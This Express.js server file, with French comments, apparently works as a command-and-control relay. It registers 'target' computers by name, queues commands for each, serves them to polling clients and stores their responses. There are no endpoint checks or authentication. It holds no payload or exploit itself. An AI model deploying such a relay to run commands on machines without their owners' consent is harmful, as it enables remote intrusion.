const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

const dataFilePath = path.join(__dirname, 'data/data.json');

app.use(express.json());

// Fonction pour lire le contenu de cibles.json
const readData = () => {
    try {
        const data = fs.readFileSync(dataFilePath, 'utf-8');
        return JSON.parse(data);
    } catch (err) {
        console.error("Erreur lors de la lecture du fichier:", err);
        return { cibleList: [], commandes: [], reponses: [] };
    }
};

// Fonction pour écrire dans data.json
const writeData = (data) => {
    try {
        fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 3));
    } catch (err) {
        console.error("Erreur lors de l'écriture dans le fichier:", err);
    }
};

// Endpoint de base
app.get('/', (req, res) => {
    res.send({ message: 'Bridge Com !' });
});

// Récupération de la liste des cibles
app.get('/cibles', (req, res) => {
    const data = readData();
    res.json({ cibleList: data.cibleList });
});

// Récupération de la liste des commandes
app.get('/commandes', (req, res) => {
    const data = readData();
    res.json({ commandes: data.commandes });
});

// Ajout d'un nom d'ordinateur
app.post('/identify', (req, res) => {
    const { computer_name = 'Unknown' } = req.body;
    const data = readData();
    data.cibleList.push(computer_name);
    writeData(data);
    res.json({ message: `Request from computer: ${computer_name}`, cibleList: data.cibleList });
});

// Ajout d'une commande
app.post('/commande', (req, res) => {
    const { commande } = req.body;
    if (!commande) {
        return res.status(400).json({ message: "Commande est requise." });
    }
    const data = readData();

    var isExist = false

    for(let i=0; i<data.commandes.length; i++){
        const dataInfo = data.commandes[i].split("%")
        const cmdInfo = commande.split("%")
        if(dataInfo[0] == cmdInfo[0]){
            data.commandes[i] = commande
            isExist = true
        }
    }

    !isExist && data.commandes.push(commande);
    writeData(data);
    res.json({ message: `Commande ajoutée: ${commande}`, commandes: data.commandes });
});


// recuperation  d'une commande
app.post('/getCommande', (req, res) => {
    const { info } = req.body;
    const data = readData();
    const commandes = data.commandes
    var newCmd = ""
    const dataInfo = info.split("%")
    
    commandes.map((cmd)=>
        {
            const dataCmd = cmd.split("%")

            if(dataCmd[0] == dataInfo[0]){
                if(dataCmd[1] != dataInfo[1]){
                    newCmd = cmd
                    
                }else{
                    if(dataCmd[2] != dataInfo[2]){
                        newCmd = cmd
                    }
                }
            }
        }
    )

    if(newCmd){
        res.json({ message: 'nouveau commande', commandes: newCmd});
    }else {
        res.json({ message: 'Aucune nouveau commande'});
    }
});





// Ajout d'une reponse
app.post('/reponse', (req, res) => {
    const { reponse } = req.body;
    if (!reponse) {
        return res.status(400).json({ message: "Reponse est requise." });
    }
    const data = readData();

    console.log(reponse)

    var isExist = false

    for(let i=0; i<data.reponses.length; i++){
        const dataInfo = data.reponses[i].split("%")
        const repInfo = reponse.split("%")
        if(dataInfo[0] == repInfo[0]){
            data.reponses[i] = reponse
            isExist = true
        }
    }

    !isExist && data.reponses.push(reponse);
    writeData(data);
    res.json({ message: `Reponse ajoutée: ${reponse}`, reponses: data.reponses });
});




// recuperation  d'une commande
app.post('/getReponse', (req, res) => {
    const { info } = req.body;
    const data = readData();
    const reponses = data.reponses
    var newRep = ""
    
    reponses.map((rep)=>
        {
            const dataRep = rep.split("%")

            if(dataRep[0] == info){
                newRep = rep
            }
        }
    )

    if(newRep){
        res.json({ message: 'reponse', reponse: newRep});
    }else {
        res.json({ message: 'Aucune reponse'});
    }
});





const PORT = 5000;

app.listen(PORT, () => console.log(`🚀 @ http://localhost:${PORT}`));
